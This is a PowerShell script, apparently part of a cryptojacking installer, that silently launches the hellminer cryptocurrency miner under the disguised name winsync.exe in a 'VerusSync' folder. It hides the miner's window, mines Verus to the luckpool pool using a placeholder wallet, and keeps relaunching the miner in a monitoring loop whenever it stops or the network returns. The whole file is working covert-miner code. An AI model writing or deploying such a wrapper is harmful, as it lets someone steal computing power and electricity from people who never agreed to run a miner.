# Verus Silent Wrapper v1
# Launched automatically by verus_setup.bat
# Do not run this directly

$exePath    = "C:\Program Files\VerusSync\winsync.exe"
$mutexName  = "Global\VerusSyncMutex"
$lockFile   = "C:\ProgramData\VerusSync\miner.lock"
$lockDir    = "C:\ProgramData\VerusSync"

# ---- Bulletproof single instance via Windows named mutex ----
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
$acquired = $false
try {
    $acquired = $mutex.WaitOne(0, $false)
} catch [System.Threading.AbandonedMutexException] {
    $acquired = $true
}

if (-not $acquired) { exit 0 }

try {
    if (-not (Test-Path $lockDir)) { New-Item -Path $lockDir -ItemType Directory -Force | Out-Null }
    New-Item -Path $lockFile -ItemType File -Force | Out-Null

    if (-not (Test-Path $exePath)) { exit 0 }

    # Network check on start
    $online = $false
    for ($i = 0; $i -lt 10; $i++) {
        try {
            Invoke-WebRequest -Uri "http://www.google.com" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
            $online = $true
            break
        } catch { Start-Sleep -Seconds 6 }
    }
    if (-not $online) { exit 0 }

    # Kill any existing instance
    Stop-Process -Name "winsync" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2

    # Launch hellminer hidden
    $pinfo = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName        = $exePath
    $pinfo.Arguments       = "-c stratum+ssl://na.luckpool.net:3958#xnsub -u YOUR_VRSC_WALLET_ADDRESS_HERE.pc1 -p x --cpu 2 --priority 1 --no-colors"
    $pinfo.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $pinfo.CreateNoWindow  = $true
    $pinfo.UseShellExecute = $false
    [System.Diagnostics.Process]::Start($pinfo) | Out-Null

    # Monitor loop
    while ($true) {
        Start-Sleep -Seconds 30

        $online = $false
        try {
            Invoke-WebRequest -Uri "http://www.google.com" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
            $online = $true
        } catch {}

        if (-not $online) {
            Stop-Process -Name "winsync" -Force -ErrorAction SilentlyContinue
            while (-not $online) {
                Start-Sleep -Seconds 15
                try {
                    Invoke-WebRequest -Uri "http://www.google.com" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
                    $online = $true
                } catch {}
            }
            [System.Diagnostics.Process]::Start($pinfo) | Out-Null
        }

        $running = Get-Process -Name "winsync" -ErrorAction SilentlyContinue
        if (-not $running) {
            Start-Sleep -Seconds 5
            [System.Diagnostics.Process]::Start($pinfo) | Out-Null
        }
    }

} finally {
    Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
    if ($acquired) { $mutex.ReleaseMutex() }
    $mutex.Dispose()
}
